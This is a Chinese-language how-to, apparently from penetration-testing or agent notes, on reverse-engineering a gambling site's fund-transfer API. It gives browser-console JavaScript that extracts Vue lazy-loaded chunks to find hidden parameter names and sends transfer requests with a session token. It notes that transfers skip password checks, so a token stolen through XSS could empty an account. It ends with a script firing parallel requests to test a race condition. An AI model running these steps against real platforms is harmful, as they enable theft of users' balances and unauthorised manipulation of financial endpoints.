# 转账/资金API逆向方法

## 问题
赌博站的转账API参数名不直观（不是简单的from/to/amount），直接猜测会返回"转账密码读取失败"或"参数校验失败"。

## 方法: Vue懒加载组件逆向

### Step 1: 找到路由表中的chunk文件名
```javascript
// 在browser_console中执行
var app = document.querySelector('#app').__vue_app__;
var router = app.config.globalProperties.$router;
var routes = router.getRoutes();
// 找到转账/提现相关的路由
routes.filter(r => r.path.includes('transfer') || r.path.includes('withdraw') || r.path.includes('quota'));
// 输出: [{path: '/quotaConversion', name: 'quotaConversion', component: ...}]
```

### Step 2: 从主bundle找到chunk文件名
```javascript
// 在主JS文件中搜索路由名
var xhr = new XMLHttpRequest();
xhr.open('GET', '/m/static/assets/js/index-xxx.js', false);
xhr.send();
var t = xhr.responseText;
var idx = t.indexOf('quotaConversion');
// 找到: import("./QuotaConversion-82bfed858eff532327c3.js")
```

### Step 3: 下载chunk并搜索API调用
```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', '/m/static/assets/js/QuotaConversion-82bfed858eff532327c3.js', false);
xhr.send();
var t = xhr.responseText;
// 搜索API相关关键词
['password', 'fromAcc', 'toAcc', 'amount', 'transfer', 'TransferOperate'].forEach(k => {
  var idx = t.indexOf(k);
  if (idx > -1) console.log(k + ':', t.substring(idx - 200, idx + 200));
});
```

### Step 4: 找到实际参数名
在chunk中找到的代码：
```javascript
var a = {transfer_amt: Ba.value, OUT_INT_IDENT_CD: Na.value, IN_INT_IDENT_CD: Ma.value};
n(a).then(...)
```
→ 参数名是 `transfer_amt`, `OUT_INT_IDENT_CD`, `IN_INT_IDENT_CD`
→ 函数`n`是从主bundle导入的`aS`，实际是`Sr.post("api/User/TransferOperate", e, {useFormData: true})`

### Step 5: 用正确格式发送请求
```javascript
var formData = new FormData();
formData.append('transfer_amt', '100');
formData.append('OUT_INT_IDENT_CD', 'my_wallet');
formData.append('IN_INT_IDENT_CD', 'ag_live');

var xhr = new XMLHttpRequest();
xhr.open('POST', '/api/User/TransferOperate', false);
xhr.setRequestHeader('Token', token);  // JSON格式的Token
xhr.setRequestHeader('platform-ident', 'uu');
xhr.send(formData);
```

## 常见转账API参数名映射

| 概念 | 可能的参数名 |
|------|-------------|
| 转账金额 | transfer_amt, amount, amt, money |
| 转出账户 | OUT_INT_IDENT_CD, fromAcc, from_account |
| 转入账户 | IN_INT_IDENT_CD, toAcc, to_account |
| 提现密码 | password, draw_password, drawPassword, DRAW_PASSWORD |
| 转账密码 | transfer_password, pay_password |

## 关键发现
- **转账API不需要提现密码** — 使用正确的FormData字段名（transfer_amt/OUT_INT_IDENT_CD/IN_INT_IDENT_CD）时，不传password也能发起转账，仅受余额限制。NB103539错误只在使用错误参数名（如password）时出现，是误导性的错误信息。
- 余额为0时返回60559（余额不足），不是NB103539
- 这意味着如果攻击者获取了有效Session Token（通过XSS等），可以直接转走账户余额
- 竞态条件无法在余额为0时验证——需要已充值账号
- 错误码60558=当前不可转换额度（账户类型不支持）
- 错误码60559=余额不足
- 错误码60459=请填写转账金额
- 错误码NB100820=余额不足（另一种格式）
- 错误码NB103539=转账密码读取失败（密码字段名错误或未设置）

## 竞态条件测试
由于Session绑定浏览器，竞态条件测试必须通过Safari的fetch API执行：
```javascript
// fire-and-forget模式
window._raceResults = {done: 0, results: []};
for (var i = 0; i < 10; i++) {
  var fd = new FormData();
  fd.append('transfer_amt', '100');
  fd.append('OUT_INT_IDENT_CD', 'my_wallet');
  fd.append('IN_INT_IDENT_CD', 'ag_live');
  fetch('/api/User/TransferOperate', {
    method: 'POST',
    headers: {'Token': token, 'platform-ident': 'uu'},
    body: fd
  }).then(r => r.text()).then(t => {
    window._raceResults.results.push(decrypt(t));
    window._raceResults.done++;
  });
}
// 等几秒后读取 window._raceResults
```
